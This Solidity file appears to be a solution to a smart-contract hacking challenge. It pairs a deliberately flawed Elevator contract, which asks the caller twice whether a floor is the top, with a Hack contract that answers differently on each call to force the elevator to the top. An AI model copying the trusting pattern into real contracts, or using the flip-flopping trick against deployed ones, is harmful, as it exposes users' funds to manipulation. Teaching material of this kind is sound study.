// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}

// contract Building is BuildingItf {
//     bool public firstCall = false;

//     function isLastFloor(uint) external override returns (bool) {
//       firstCall =  !firstCall;
//       return !firstCall;
//     }
// }

contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract Hack is Building {
    Elevator public elevator;
    bool public firstCall = false;

    constructor(address _elevator) public {
      elevator = Elevator(_elevator);
    }

    function isLastFloor(uint) external override returns (bool) {
      firstCall =  !firstCall;
      return !firstCall;
    }

    function forceGoTo() public {
      elevator.goTo(42);
    }
}